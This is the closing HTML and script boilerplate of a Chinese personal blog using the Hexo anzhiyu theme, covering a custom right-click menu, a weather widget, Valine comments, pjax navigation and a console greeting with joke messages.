class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div id="he-plugin-simple"></div><script>var WIDGET = {
+  "CONFIG": {
+    "modules": "0124",
+    "background": "2",
+    "tmpColor": "FFFFFF",
+    "tmpSize": "16",
+    "cityColor": "FFFFFF",
+    "citySize": "16",
+    "aqiColor": "E8D87B",
+    "aqiSize": "16",
+    "weatherIconSize": "24",
+    "alertIconSize": "18",
+    "padding": "10px 10px 10px 10px",
+    "shadow": "0",
+    "language": "auto",
+    "borderRadius": "20",
+    "fixed": "true",
+    "vertical": "top",
+    "horizontal": "left",
+    "left": "20",
+    "top": "7.1",
+    "key": "df245676fb434a0691ead1c63341cd94"
+  }
+}
+</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script><div><script src="https://npm.elemecdn.com/hexo-theme-anzhiyu@1.4.2/source/js/utils.js"></script><script src="https://npm.elemecdn.com/hexo-theme-anzhiyu@1.4.2/source/js/main.js"></script><script src="https://npm.elemecdn.com/hexo-theme-anzhiyu@1.4.2/source/js/tw_cn.js"></script><script src="https://npm.elemecdn.com/@fancyapps/ui@4.0.31/dist/fancybox.umd.js"></script><script src="https://npm.elemecdn.com/instant.page@5.1.1/instantpage.js" type="module"></script><script src="https://npm.elemecdn.com/vanilla-lazyload@17.3.1/dist/lazyload.iife.min.js"></script><script src="https://npm.elemecdn.com/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 1.4.2",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#3b70fc",
+      "",
+      "color:#3b70fc",
+      "color:#3b70fc",
+      "",
+      "color:#3b70fc",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 废柴 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'QH7CbzZKUvRGincB58FH4C5e-gzGzoHsz',
+      appKey: 'S1X4SBgDn035Od7FxPdSYd99',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://npm.elemecdn.com/valine@1.5.1/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://npm.elemecdn.com/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getIcon = (icon, mail) => {
+    if (icon) return icon
+    let defaultIcon = '?d=monsterid'
+    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
+    return iconUrl
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getComment = () => {
+    const serverURL = 'https://QH7CbzZK.api.lncldglobal.com'
+
+    var settings = {
+      "method": "GET",
+      "headers": {
+        "X-LC-Id": 'QH7CbzZKUvRGincB58FH4C5e-gzGzoHsz',
+        "X-LC-Key": 'S1X4SBgDn035Od7FxPdSYd99',
+        "Content-Type": "application/json"
+      },
+    }
+
+    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
+      .then(response => response.json())
+      .then(data => {
+        const valineArray = data.results.map(function (e) {
+          return {
+            'avatar': getIcon(e.QQAvatar, e.mail),
+            'content': changeContent(e.comment),
+            'nick': e.nick,
+            'url': e.url + '#' + e.objectId,
+            'date': e.updatedAt,
+          }
+        })
+        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
+        generateHtml(valineArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.innerHTML= "无法获取评论，请确认相关配置是否正确"
+      }) 
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('valine-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "visitor@anheyu.com";</script><script>//动态标题
+let leaveTitle = 'w(ﾟДﾟ)w 不要走！再看看嘛！';
+let backTitle = '♪(^∇^*)欢迎肥来！';
+let OriginTitile = document.title
+let titleTime
+document.addEventListener('visibilitychange', function () {
+  if (document.hidden) {
+    //离开当前页面时标签显示内容
+    document.title = leaveTitle
+    clearTimeout(titleTime)
+  } else {
+    //返回当前页面时标签显示内容
+    document.title = backTitle + OriginTitile
+    //两秒后变回正常标题
+    titleTime = setTimeout(function () {
+      document.title = OriginTitile
+    }, 2000)
+  }
+})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script>// 初始化函数
+let rm = {};
+
+//禁止图片与超链接拖拽
+let aElements = document.getElementsByTagName("a");
+for (let i = 0; i < aElements.length; i++) {
+  aElements[i].setAttribute("draggable", "false");
+  let imgElements = aElements[i].getElementsByTagName("img");
+  for (let j = 0; j < imgElements.length; j++) {
+    imgElements[j].setAttribute("draggable", "false");
+  }
+}
+
+// 显示菜单
+rm.showRightMenu = function (isTrue, x = 0, y = 0) {
+  console.info(x, y)
+  let rightMenu = document.getElementById("rightMenu");
+  rightMenu.style.top = x + "px";
+  rightMenu.style.left = y + "px";
+  if (isTrue) {
+    rightMenu.style.display = "block";
+    stopMaskScroll();
+  } else {
+    rightMenu.style.display = "none";
+  }
+};
+
+// 隐藏菜单
+rm.hideRightMenu = function () {
+  rm.showRightMenu(false);
+  let rightMenuMask = document.querySelector("#rightmenu-mask");
+  rightMenuMask.style.display = "none";
+};
+
+// 尺寸
+let rmWidth = document.getElementById("rightMenu").offsetWidth;
+let rmHeight = document.getElementById("rightMenu").offsetHeight;
+
+// 重新定义尺寸
+rm.reloadrmSize = function () {
+  rightMenu.style.visibility = "hidden";
+  rightMenu.style.display = "block";
+  // 获取宽度和高度
+  rmWidth = document.getElementById("rightMenu").offsetWidth;
+  rmHeight = document.getElementById("rightMenu").offsetHeight;
+  rightMenu.style.visibility = "visible";
+};
+
+// 获取点击的href
+let domhref = "";
+let domImgSrc = "";
+let globalEvent = null;
+
+var oncontextmenuFunction = function (event) {
+  if (document.body.clientWidth > 768) {
+    let pageX = event.clientX + 10; //加10是为了防止显示时鼠标遮在菜单上
+    let pageY = event.clientY;
+
+    //其他额外菜单
+    const $rightMenuOther = document.querySelector(".rightMenuOther");
+    const $rightMenuPlugin = document.querySelector(".rightMenuPlugin");
+    const $rightMenuCopyText = document.querySelector("#menu-copytext");
+    const $rightMenuPasteText = document.querySelector("#menu-pastetext");
+    const $rightMenuCommentText = document.querySelector("#menu-commenttext");
+    const $rightMenuNewWindow = document.querySelector("#menu-newwindow");
+    const $rightMenuNewWindowImg = document.querySelector("#menu-newwindowimg");
+    const $rightMenuCopyLink = document.querySelector("#menu-copylink");
+    const $rightMenuCopyImg = document.querySelector("#menu-copyimg");
+    const $rightMenuDownloadImg = document.querySelector("#menu-downloadimg");
+    const $rightMenuSearch = document.querySelector("#menu-search");
+    const $rightMenuSearchBaidu = document.querySelector("#menu-searchBaidu");
+    const $rightMenuMusicToggle = document.querySelector("#menu-music-toggle");
+    const $rightMenuMusicBack = document.querySelector("#menu-music-back");
+    const $rightMenuMusicForward = document.querySelector("#menu-music-forward");
+    const $rightMenuMusicPlaylist = document.querySelector("#menu-music-playlist");
+    const $rightMenuMusicCopyMusicName = document.querySelector("#menu-music-copyMusicName");
+
+    let href = event.target.href;
+    let imgsrc = event.target.currentSrc;
+
+    // 判断模式 扩展模式为有事件
+    let pluginMode = false;
+    $rightMenuOther.style.display = "block";
+    globalEvent = event;
+
+    // 检查是否需要复制 是否有选中文本
+    if (selectTextNow && window.getSelection()) {
+      pluginMode = true;
+      $rightMenuCopyText.style.display = "block";
+      $rightMenuCommentText.style.display = "block";
+      $rightMenuSearch.style.display = "block";
+      $rightMenuSearchBaidu.style.display = "block";
+    } else {
+      $rightMenuCopyText.style.display = "none";
+      $rightMenuCommentText.style.display = "none";
+      $rightMenuSearchBaidu.style.display = "none";
+      $rightMenuSearch.style.display = "none";
+    }
+
+    //检查是否右键点击了链接a标签
+    if (href) {
+      pluginMode = true;
+      $rightMenuNewWindow.style.display = "block";
+      $rightMenuCopyLink.style.display = "block";
+      domhref = href;
+    } else {
+      $rightMenuNewWindow.style.display = "none";
+      $rightMenuCopyLink.style.display = "none";
+    }
+
+    //检查是否需要复制图片
+    if (imgsrc) {
+      pluginMode = true;
+      $rightMenuCopyImg.style.display = "block";
+      $rightMenuDownloadImg.style.display = "block";
+      $rightMenuNewWindowImg.style.display = "block";
+      document.getElementById("rightMenu").style.width="12rem"
+      domImgSrc = imgsrc;
+    } else {
+      $rightMenuCopyImg.style.display = "none";
+      $rightMenuDownloadImg.style.display = "none";
+      $rightMenuNewWindowImg.style.display = "none";
+    }
+
+    // 判断是否为输入框
+    if (event.target.tagName.toLowerCase() === "input" || event.target.tagName.toLowerCase() === "textarea") {
+      pluginMode = true;
+      $rightMenuPasteText.style.display = "block";
+    } else {
+      $rightMenuPasteText.style.display = "none";
+    }
+    const navMusicEl = document.querySelector("#nav-music");
+    //判断是否是音乐
+    if (navMusicEl && navMusicEl.contains(event.target)) {
+      pluginMode = true;
+      $rightMenuMusicToggle.style.display = "block";
+      $rightMenuMusicBack.style.display = "block";
+      $rightMenuMusicForward.style.display = "block";
+      $rightMenuMusicPlaylist.style.display = "block";
+      $rightMenuMusicCopyMusicName.style.display = "block";
+    } else {
+      $rightMenuMusicToggle.style.display = "none";
+      $rightMenuMusicBack.style.display = "none";
+      $rightMenuMusicForward.style.display = "none";
+      $rightMenuMusicPlaylist.style.display = "none";
+      $rightMenuMusicCopyMusicName.style.display = "none";
+    }
+
+    // 如果不是扩展模式则隐藏扩展模块
+    if (pluginMode) {
+      $rightMenuOther.style.display = "none";
+      $rightMenuPlugin.style.display = "block";
+    } else {
+      $rightMenuPlugin.style.display = "none";
+    }
+
+    rm.reloadrmSize();
+
+    // 鼠标默认显示在鼠标右下方，当鼠标靠右或靠下时，将菜单显示在鼠标左方\上方
+    if (pageX + rmWidth > window.innerWidth) {
+      pageX -= rmWidth + 10;
+    }
+    if (pageY + rmHeight > window.innerHeight) {
+      pageY -= pageY + rmHeight - window.innerHeight;
+    }
+
+    rm.showRightMenu(true, pageY, pageX);
+    document.getElementById("rightmenu-mask").style.display = "flex";
+    return false;
+  }
+};
+
+// 监听右键初始化
+window.oncontextmenu = oncontextmenuFunction
+
+// 下载图片状态
+rm.downloadimging = false;
+
+// 复制图片到剪贴板
+rm.writeClipImg = function (imgsrc) {
+  console.log("按下复制");
+  rm.hideRightMenu();
+  anzhiyu.snackbarShow("正在下载中，请稍后", false, 10000);
+  if (rm.downloadimging == false) {
+    rm.downloadimging = true;
+    setTimeout(function () {
+      copyImage(imgsrc);
+      anzhiyu.snackbarShow("复制成功！图片已添加盲水印，请遵守版权协议");
+      rm.downloadimging = false;
+    }, "10000");
+  }
+};
+
+function imageToBlob(imageURL) {
+  const img = new Image();
+  const c = document.createElement("canvas");
+  const ctx = c.getContext("2d");
+  img.crossOrigin = "";
+  img.src = imageURL;
+  return new Promise(resolve => {
+    img.onload = function () {
+      c.width = this.naturalWidth;
+      c.height = this.naturalHeight;
+      ctx.drawImage(this, 0, 0);
+      c.toBlob(
+        blob => {
+          // here the image is a blob
+          resolve(blob);
+        },
+        "image/png",
+        0.75
+      );
+    };
+  });
+}
+
+async function copyImage(imageURL) {
+  const blob = await imageToBlob(imageURL);
+  const item = new ClipboardItem({ "image/png": blob });
+  navigator.clipboard.write([item]);
+}
+
+rm.copyUrl = function (id) {
+  const input = document.createElement("input"); // Create a new <input> element
+  input.id = "copyVal"; // Set the id of the new element to "copyVal"
+  document.body.appendChild(input); // Append the new element to the end of the <body> element
+  
+  const text = id;
+  input.value = text;
+  input.select();
+  input.setSelectionRange(0, input.value.length);
+  document.execCommand("copy");
+  
+  input.remove(); // Remove the <input> element from the DOM
+};
+
+function stopMaskScroll() {
+  if (document.getElementById("rightmenu-mask")) {
+    let xscroll = document.getElementById("rightmenu-mask");
+    xscroll.addEventListener(
+      "mousewheel",
+      function (e) {
+        //阻止浏览器默认方法
+        rm.hideRightMenu();
+        // e.preventDefault();
+      },
+      { passive: true }
+    );
+  }
+  if (document.getElementById("rightMenu")) {
+    let xscroll = document.getElementById("rightMenu");
+    xscroll.addEventListener(
+      "mousewheel",
+      function (e) {
+        //阻止浏览器默认方法
+        rm.hideRightMenu();
+        // e.preventDefault();
+      },
+      { passive: true }
+    );
+  }
+}
+
+rm.rightmenuCopyText = function (txt) {
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(txt);
+  }
+  rm.hideRightMenu();
+};
+
+rm.copyPageUrl = function (url) {
+  if (!url) {
+    url = window.location.href;
+  }
+  rm.copyUrl(url);
+  anzhiyu.snackbarShow("复制本页链接地址成功", false, 2000);
+  rm.hideRightMenu();
+};
+
+rm.sharePage = function () {
+  var content = window.location.href;
+  rm.copyUrl(url);
+  anzhiyu.snackbarShow("复制本页链接地址成功", false, 2000);
+  rm.hideRightMenu();
+};
+
+// 复制当前选中文本
+var selectTextNow = "";
+document.onmouseup = document.ondblclick = selceText;
+
+function selceText() {
+  var txt;
+  if (document.selection) {
+    txt = document.selection.createRange().text;
+  } else {
+    txt = window.getSelection().toString();
+  }
+  selectTextNow = txt !== "" ? txt : "";
+}
+
+// 读取剪切板
+rm.readClipboard = function () {
+  if (navigator.clipboard) {
+    navigator.clipboard.readText().then(clipText => rm.insertAtCaret(globalEvent.target, clipText));
+  }
+};
+
+// 粘贴文本到焦点
+rm.insertAtCaret = function (elemt, value) {
+  const startPos = elemt.selectionStart,
+    endPos = elemt.selectionEnd;
+  if (document.selection) {
+    elemt.focus();
+    var sel = document.selection.createRange();
+    sel.text = value;
+    elemt.focus();
+  } else {
+    if (startPos || startPos == "0") {
+      var scrollTop = elemt.scrollTop;
+      elemt.value = elemt.value.substring(0, startPos) + value + elemt.value.substring(endPos, elemt.value.length);
+      elemt.focus();
+      elemt.selectionStart = startPos + value.length;
+      elemt.selectionEnd = startPos + value.length;
+      elemt.scrollTop = scrollTop;
+    } else {
+      elemt.value += value;
+      elemt.focus();
+    }
+  }
+};
+
+//粘贴文本
+rm.pasteText = function () {
+  const result = rm.readClipboard() || "";
+  rm.hideRightMenu();
+};
+
+//引用到评论
+rm.rightMenuCommentText = function (txt) {
+  rm.hideRightMenu();
+  const postCommentDom = document.getElementById("post-comment");
+  var domTop = postCommentDom.offsetTop;
+  window.scrollTo(0, domTop - 80);
+  if (txt == "undefined" || txt == "null") txt = "好棒！";
+  function setText() {
+    setTimeout(() => {
+      var input = document.getElementsByClassName("el-textarea__inner")[0];
+      if (!input) setText();
+      let evt = document.createEvent("HTMLEvents");
+      evt.initEvent("input", true, true);
+      let inputValue = replaceAll(txt, "\n", "\n> ");
+      input.value = "> " + inputValue + "\n\n";
+      input.dispatchEvent(evt);
+      input.focus();
+      input.setSelectionRange(-1, -1);
+      if (document.getElementById("comment-tips")) {
+        document.getElementById("comment-tips").classList.add("show");
+      }
+    }, 100);
+  }
+  setText();
+};
+
+//替换所有内容
+function replaceAll(string, search, replace) {
+  return string.split(search).join(replace);
+}
+
+// 百度搜索
+rm.searchBaidu = function () {
+  anzhiyu.snackbarShow("即将跳转到百度搜索", false, 2000);
+  setTimeout(function () {
+    window.open("https://www.baidu.com/s?wd=" + selectTextNow);
+  }, "2000");
+  rm.hideRightMenu();
+};
+
+//分享链接
+rm.copyLink = function () {
+  rm.rightmenuCopyText(domhref);
+  anzhiyu.snackbarShow("已复制链接地址");
+};
+
+function addRightMenuClickEvent() {
+  // 添加点击事件
+  document.getElementById("menu-backward").addEventListener("click", function () {
+  window.history.back();
+    rm.hideRightMenu();
+  });
+
+  document.getElementById("menu-forward").addEventListener("click", function () {
+    window.history.forward();
+    rm.hideRightMenu();
+  });
+
+  document.getElementById("menu-refresh").addEventListener("click", function () {
+    window.location.reload();
+  });
+
+  document.getElementById("menu-top").addEventListener("click", function () {
+    anzhiyu.scrollToDest(0, 500);
+    rm.hideRightMenu();
+  });
+
+  const menuLinks = document.querySelectorAll(".menu-link");
+  menuLinks.forEach(function (link) {
+    link.addEventListener("click", rm.hideRightMenu);
+  });
+
+  document.getElementById("menu-darkmode").addEventListener("click", anzhiyu.switchDarkMode);
+
+  document.getElementById("menu-home") && document.getElementById("menu-home").addEventListener("click", function () {
+    window.location.href = window.location.origin;
+  });
+
+  document.getElementById("menu-randomPost").addEventListener("click", function () {
+    toRandomPost();
+  });
+
+  document.getElementById("menu-commentBarrage").addEventListener("click", anzhiyu.switchCommentBarrage);
+
+  document.getElementById("rightmenu-mask").addEventListener("click", rm.hideRightMenu);
+
+  document.getElementById("rightmenu-mask").addEventListener("contextmenu", function (event) {
+    rm.hideRightMenu();
+    event.preventDefault(); // Prevent the default context menu from appearing
+  });
+
+  document.getElementById("menu-copy").addEventListener("click", rm.copyPageUrl);
+
+  document.getElementById("menu-pastetext").addEventListener("click", rm.pasteText);
+
+  document.getElementById("menu-copytext").addEventListener("click", function () {
+    rm.rightmenuCopyText(selectTextNow);
+    anzhiyu.snackbarShow("复制成功，复制和转载请标注本文地址");
+  });
+
+  document.getElementById("menu-commenttext").addEventListener("click", function () {
+    rm.rightMenuCommentText(selectTextNow);
+  });
+
+  document.getElementById("menu-newwindow").addEventListener("click", function () {
+    window.open(domhref, "_blank");
+    rm.hideRightMenu();
+  });
+
+  document.getElementById("menu-copylink").addEventListener("click", rm.copyLink);
+
+  document.getElementById("menu-downloadimg").addEventListener("click", function () {
+    anzhiyu.downloadImage(domImgSrc, "anzhiyu");
+  });
+
+  document.getElementById("menu-newwindowimg").addEventListener("click", function () {
+    window.open(domImgSrc, "_blank");
+    rm.hideRightMenu();
+  });
+
+  document.getElementById("menu-copyimg").addEventListener("click", function () {
+    rm.writeClipImg(domImgSrc);
+  });
+
+  document.getElementById("menu-searchBaidu").addEventListener("click", rm.searchBaidu);
+
+  //音乐
+  document.getElementById("menu-music-toggle").addEventListener("click", anzhiyu.musicToggle);
+
+  document.getElementById("menu-music-back").addEventListener("click", anzhiyu.musicSkipBack);
+
+  document.getElementById("menu-music-forward").addEventListener("click", anzhiyu.musicSkipForward);
+
+  document.getElementById("menu-music-copyMusicName").addEventListener("click", function () {
+    rm.rightmenuCopyText(anzhiyu.musicGetName());
+    anzhiyu.snackbarShow("复制歌曲名称成功", false, 3000);
+  });
+
+}
+
+addRightMenuClickEvent();</script><script data-pjax>var themeColorMeta = document.querySelector('meta[name="theme-color"]');
+var pageHeaderEl = document.getElementById("page-header");
+var navMusicEl = document.getElementById("nav-music");
+var consoleEl = document.getElementById("console");
+// 已随机的歌曲
+var selectRandomSong = [];
+// 音乐默认声音大小
+var musicVolume = 0.8;
+// 是否切换了周杰伦音乐列表
+var changeMusicListFlag = false;
+// 当前默认播放列表
+var defaultPlayMusicList = [];
+
+document.getElementById("page-name").innerText = document.title.split(" | 废柴の博客")[0];
+anzhiyu.initIndexEssay();
+anzhiyu.changeTimeInEssay();
+anzhiyu.removeBodyPaceClass();
+anzhiyu.qrcodeCreate();
+anzhiyu.changeTimeInAlbumDetail();
+anzhiyu.reflashEssayWaterFall();
+anzhiyu.sayhi();
+anzhiyu.stopImgRightDrag();
+anzhiyu.addNavBackgroundInit();
+anzhiyu.setValueToBodyType();
+anzhiyu.catalogActive();
+anzhiyu.tagsPageActive();
+anzhiyu.categoriesBarActive();
+anzhiyu.topCategoriesBarScroll();
+anzhiyu.switchRightClickMenuHotReview();
+anzhiyu.getCustomPlayList();
+anzhiyu.addEventListenerConsoleMusicList(false);
+setTimeout(() => {
+  if (typeof addFriendLinksInFooter === "function") {
+    addFriendLinksInFooter();
+  }
+}, 200)</script><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.1.8/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://npm.elemecdn.com/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://npm.elemecdn.com/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://npm.elemecdn.com/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div></body></html>
